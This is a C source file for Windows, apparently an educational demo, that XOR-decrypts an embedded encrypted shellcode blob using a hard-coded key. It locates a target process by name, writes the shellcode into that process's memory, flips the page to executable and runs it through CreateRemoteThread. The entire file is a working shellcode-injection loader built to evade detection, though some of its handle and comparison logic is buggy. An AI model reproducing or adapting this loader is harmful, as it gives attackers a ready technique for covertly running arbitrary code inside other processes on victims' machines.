#include <stdio.h>
#include <Windows.h>
#include <wchar.h>
#include <tlhelp32.h>

unsigned char encrypted[] = "\x88\x20\xea\x97\x95\x8d\xad\x73\x71\x75\x28\x25\x24\x38\x33\x23\x32\x3c\x5e\xb1\x17\x29\xe8\x39\x0d\x21\xe8\x20\x77\x3b\xe7\x3d\x50\x78\xbb\x42\x61\x7a\x3f\x87\x78\x7a\x7d\x01\xfb\x3c\x59\xa9\xdf\x59\x04\x11\x71\x5d\x55\x28\xb5\xac\x65\x20\x73\xa5\x96\x82\x31\x33\x30\x2b\xe0\x3f\x49\xe8\x30\x53\x3b\x6d\xbf\xfb\xb0\xb8\x30\x31\x32\x78\xb5\xf2\x44\x57\x78\x33\xa4\x38\xe2\x3b\x7d\x21\xe6\x33\x51\x3c\x68\xa4\x86\x3e\x29\x8d\xad\x35\xe4\x57\xfa\x29\x62\xbd\x20\x58\xaa\x3a\x5e\xb3\xc0\x2e\xb1\xf9\x3d\x71\x30\xf3\x08\xd0\x47\xc1\x7c\x33\x7e\x50\x60\x2c\x4a\xb4\x10\xb5\x2b\x35\xfe\x29\x50\x2c\x69\xb1\x14\x25\xff\x63\x2b\x36\xea\x23\x77\x24\x68\xb3\x33\xe4\x77\xe4\x27\x71\xe0\x71\x68\x70\x6a\x6e\x69\x68\x71\x68\x71\x6b\x35\x32\x21\xf0\x89\x45\x2c\x21\x8e\x95\x31\x35\x3c\x32\x29\xf9\x76\x9d\x38\x9c\x8d\x9e\x3e\x23\xd7\x68\x63\x72\x6f\x73\x6c\x6f\x70\x78\xbd\xbd\x30\x33\x30\x30\x73\x8a\x01\xbb\x5d\xf3\x97\xbc\xc8\x85\x78\x47\x79\x30\xcf\xcf\xe1\xd8\xf5\x9e\xa7\x2c\xf7\xab\x4b\x4e\x67\x1f\x61\xed\x92\x83\x07\x6a\xc8\x2b\x7c\x02\x5f\x5a\x30\x68\x73\xb9\xea\xcd\xe5\x53\x51\x5e\x17\x46\x0c\x0b\x00\x65";

unsigned char decrypted[sizeof(encrypted)];

int main(int agrc , wchar_t* argv[])
{	
	char key[] = "thiseemsquitehardtocrackmicroslop000120020002";

	int key_size = strlen(key);

	int enc_shellcode_size = sizeof(encrypted) - 1;

	for (int i = 0;i < enc_shellcode_size;i++) {
		decrypted[i] = encrypted[i] ^ key[i % key_size];
		//printf("\\x%02x",decrypted[i]);
	}

	printf("Encrypted shellcode address : %p\n", encrypted);

	printf("Decrypted shellcode address : %p\n", decrypted);

	printf("Press < Enter > to continue\n");
	getchar();

	memset(encrypted,'\0',enc_shellcode_size);

	printf("The encrypted shellcode is overwritten ! Press < Enter > to continue\n");
	getchar();

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

	BOOL process_first = Process32First(snapshot,&pe32);
	
	//do {
	//	printf("%ls : %lu\n",pe32.szExeFile,pe32.th32ProcessID);
	//} while (Process32Next(snapshot,&pe32));
	
	DWORD dwProcessId = 0;

	do {
		if (wcscmp(pe32.szExeFile, argv[1]))
		{
			dwProcessId = pe32.th32ProcessID;
		}
	}while (Process32Next(snapshot,&pe32));

	printf("PID : %d\n",dwProcessId);

	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);

	LPVOID alloc = VirtualAllocEx(process,NULL,enc_shellcode_size,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);

	printf("allocated empty space at : %p\n",alloc);
	
	printf("Press < Enter > to write the decrypted shellcode\n");
	getchar();

	SIZE_T* lpNumberOfBytesWritten = 0;

	BOOL write = WriteProcessMemory(process,alloc,decrypted,enc_shellcode_size,&lpNumberOfBytesWritten);

	printf("Press < Enter > to continue\n");
	getchar();

	memset(decrypted, '\0', enc_shellcode_size);

	printf("The decrypted shellcode is overwritten ! Press < Enter > to continue\n");
	getchar();

	PDWORD lpflOldProtect = PAGE_READWRITE;

	printf("Press < Enter > to change the page access from RW --> RX\n");
	getchar();

	BOOL protection = VirtualProtectEx(process,alloc,enc_shellcode_size,PAGE_EXECUTE_READ,&lpflOldProtect);

	HANDLE thread = CreateRemoteThread(process,NULL,0,(LPTHREAD_START_ROUTINE)alloc,NULL,0, NULL);

	WaitForSingleObject(thread,5000);

	printf("Press < Enter > to quit");
	getchar();

}
